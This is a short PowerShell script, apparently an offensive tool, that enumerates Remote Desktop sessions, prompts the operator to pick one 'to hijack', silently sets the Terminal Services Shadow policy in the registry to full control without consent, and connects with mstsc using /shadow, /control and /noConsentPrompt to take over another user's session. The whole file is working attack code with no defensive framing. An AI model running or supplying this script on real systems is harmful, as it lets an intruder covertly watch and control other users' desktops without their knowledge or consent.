Clear-Host 
$Sessions = C:\Windows\System32\qwinsta.exe /server:$ComputerName |
ForEach-Object {
    $_.Trim() -replace "\s+",","
} |
ConvertFrom-Csv | ?{($_.SESSIONNAME -notlike '*services*') -And ($_.SESSIONNAME -notlike '*rdp-tcp') -And ($_.USERNAME -notlike '1')}

Write-Host "Current RDP Sessions" -ForegroundColor Yellow
Write-Host "===================="
$i=0
$Sessions | ForEach-Object{Write-Host $i": " $_.USERNAME; $i++}
Write-Host "===================="
$selection = Read-Host "Enter the number of the session to hijack"
Clear-Host

Write-Host "Enabling RDP Shadowing" -ForegroundColor Yellow
$RegPath = $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
$Name = "Shadow"
$Value = 2
New-ItemProperty -Path $RegPath -Name $Name -Value $value -PropertyTYpe DWORD -Force
Clear-Host

Write-Host "Connecting to Session" ($Sessions[$selection]).USERNAME -ForegroundColor Yellow
mstsc /v:localhost /shadow:($Sessions[$selection]).ID /control /noConsentPrompt